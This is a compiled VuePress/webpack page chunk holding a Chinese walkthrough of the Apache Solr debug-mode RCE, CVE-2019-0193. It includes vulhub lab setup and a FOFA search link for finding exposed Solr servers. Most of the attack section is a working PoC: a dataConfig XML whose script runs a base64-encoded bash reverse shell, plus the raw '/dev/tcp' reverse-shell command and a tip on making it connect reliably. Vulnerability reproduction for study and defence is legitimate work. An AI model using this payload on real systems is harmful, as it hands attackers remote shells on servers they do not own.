(window.webpackJsonp=window.webpackJsonp||[]).push([[173],{2830:function(a,t,s){a.exports=s.p+"assets/img/6b8ee428-c68d-4517-8206-fb6eda9d4e5b.e7f8f3bd.png"},2831:function(a,t,s){a.exports=s.p+"assets/img/9e50ce8c-94b7-461c-95e9-17030e72623f.fbbd9b0b.png"},2832:function(a,t,s){a.exports=s.p+"assets/img/7217d375-48e1-460e-bb1e-c1db123daff1.644c527f.png"},2833:function(a,t,s){a.exports=s.p+"assets/img/999fb5d8-a762-4957-a9b7-a6e66df216dd.04a1c72d.png"},3592:function(a,t,s){"use strict";s.r(t);var e=s(68),n=Object(e.a)({},(function(){var a=this,t=a._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[t("h1",{attrs:{id:"apache-solr-debug-mode-远程执行漏洞-cve-2019-0193"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#apache-solr-debug-mode-远程执行漏洞-cve-2019-0193"}},[a._v("#")]),a._v(" Apache Solr Debug-Mode 远程执行漏洞 CVE-2019-0193")]),a._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),t("p",[a._v("2019 年 08 月 01 日，Apache Solr 官方发布预警，Apache Solr DataImport 功能 在开启 Debug 模式时，可以接收来自请求的”dataConfig”参数，这个参数的功能与data-config.xml 一样，不过是在开启 Debug 模式时方便通过此参数进行调试，并且 Debug 模式的开启是通过参数传入的。在 dataConfig 参数中可以包含 script 恶意脚本导致远程代码执行。")]),a._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),t("a-checkbox",{attrs:{checked:""}},[a._v("Apache Solr")]),t("br"),a._v(" "),t("h2",{attrs:{id:"网络测绘"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[a._v("#")]),a._v(" 网络测绘")]),a._v(" "),t("a-checkbox",{attrs:{checked:""}},[t("a-button",{attrs:{href:"https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtU29sciI%3D"}},[a._v('FOFA: app="APACHE-Solr"')])],1),a._v(" "),t("h2",{attrs:{id:"环境搭建"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[a._v("#")]),a._v(" 环境搭建")]),a._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[a._v("https://github.com/vulhub/vulhub.git\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("cd")]),a._v(" vulhub/solr/CVE-2019-0193\n"),t("span",{pre:!0,attrs:{class:"token function"}},[a._v("docker-compose")]),a._v(" build\n"),t("span",{pre:!0,attrs:{class:"token function"}},[a._v("docker-compose")]),a._v(" up "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-d")]),a._v("\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[a._v("# 创建一个solr核心test")]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[a._v("docker-compose")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("exec")]),a._v(" solr "),t("span",{pre:!0,attrs:{class:"token function"}},[a._v("bash")]),a._v(" bin/solr create_core "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-c")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("test")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-d")]),a._v(" example/example-DIH/solr/db\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br"),t("span",{staticClass:"line-number"},[a._v("5")]),t("br"),t("span",{staticClass:"line-number"},[a._v("6")]),t("br"),t("span",{staticClass:"line-number"},[a._v("7")]),t("br")])]),t("p",[a._v("访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可")]),a._v(" "),t("p",[t("img",{attrs:{src:s(2830),alt:"6b8ee428-c68d-4517-8206-fb6eda9d4e5b"}})]),a._v(" "),t("h2",{attrs:{id:"登录页面"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#登录页面"}},[a._v("#")]),a._v(" 登录页面")]),a._v(" "),t("p",[a._v("点击刚刚创建的test进入调试")]),a._v(" "),t("p",[t("img",{attrs:{src:s(2831),alt:"9e50ce8c-94b7-461c-95e9-17030e72623f"}})]),a._v(" "),t("p",[a._v("将下面的POC代码填入 Debug-Mode 中")]),a._v(" "),t("div",{staticClass:"language-xml line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-xml"}},[t("code",[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("<")]),a._v("dataConfig")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(">")])]),a._v("\n  "),t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("<")]),a._v("dataSource")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token attr-name"}},[a._v("type")]),t("span",{pre:!0,attrs:{class:"token attr-value"}},[t("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[a._v("=")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v('"')]),a._v("URLDataSource"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v('"')])]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("/>")])]),a._v("\n  "),t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("<")]),a._v("script")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(">")])]),t("span",{pre:!0,attrs:{class:"token cdata"}},[a._v('<![CDATA[\n          function poc(){ java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}");\n          }\n  ]]>')]),t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("</")]),a._v("script")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(">")])]),a._v("\n  "),t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("<")]),a._v("document")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(">")])]),a._v("\n    "),t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("<")]),a._v("entity")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token attr-name"}},[a._v("name")]),t("span",{pre:!0,attrs:{class:"token attr-value"}},[t("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[a._v("=")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v('"')]),a._v("stackoverflow"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v('"')])]),a._v("\n            "),t("span",{pre:!0,attrs:{class:"token attr-name"}},[a._v("url")]),t("span",{pre:!0,attrs:{class:"token attr-value"}},[t("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[a._v("=")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v('"')]),a._v("https://stackoverflow.com/feeds/tag/solr"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v('"')])]),a._v("\n            "),t("span",{pre:!0,attrs:{class:"token attr-name"}},[a._v("processor")]),t("span",{pre:!0,attrs:{class:"token attr-value"}},[t("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[a._v("=")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v('"')]),a._v("XPathEntityProcessor"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v('"')])]),a._v("\n            "),t("span",{pre:!0,attrs:{class:"token attr-name"}},[a._v("forEach")]),t("span",{pre:!0,attrs:{class:"token attr-value"}},[t("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[a._v("=")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v('"')]),a._v("/feed"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v('"')])]),a._v("\n            "),t("span",{pre:!0,attrs:{class:"token attr-name"}},[a._v("transformer")]),t("span",{pre:!0,attrs:{class:"token attr-value"}},[t("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[a._v("=")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v('"')]),a._v("script:poc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v('"')])]),a._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("/>")])]),a._v("\n  "),t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("</")]),a._v("document")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(">")])]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("</")]),a._v("dataConfig")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(">")])]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br"),t("span",{staticClass:"line-number"},[a._v("5")]),t("br"),t("span",{staticClass:"line-number"},[a._v("6")]),t("br"),t("span",{staticClass:"line-number"},[a._v("7")]),t("br"),t("span",{staticClass:"line-number"},[a._v("8")]),t("br"),t("span",{staticClass:"line-number"},[a._v("9")]),t("br"),t("span",{staticClass:"line-number"},[a._v("10")]),t("br"),t("span",{staticClass:"line-number"},[a._v("11")]),t("br"),t("span",{staticClass:"line-number"},[a._v("12")]),t("br"),t("span",{staticClass:"line-number"},[a._v("13")]),t("br"),t("span",{staticClass:"line-number"},[a._v("14")]),t("br")])]),t("p",[a._v("注意 POC 执行的代码中的base64字符串的位置请置换成自己的ip地址并base64加密填入")]),a._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[a._v("bash")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-i")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">&")]),a._v(" /dev/tcp/xxx.xxx.xxx.xxx/9999 "),t("span",{pre:!0,attrs:{class:"token operator"}},[t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[a._v("0")]),a._v(">")]),t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[a._v("&1")]),a._v("\n直接如上写入反弹无反应，不稳定，需要base64加密写才能反弹一个shell\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br")])]),t("p",[a._v("点击EXecute执行代码")]),a._v(" "),t("p",[t("img",{attrs:{src:s(2832),alt:"7217d375-48e1-460e-bb1e-c1db123daff1"}})]),a._v(" "),t("p",[t("img",{attrs:{src:s(2833),alt:"999fb5d8-a762-4957-a9b7-a6e66df216dd"}})])],1)}),[],!1,null,null,null);t.default=n.exports}}]);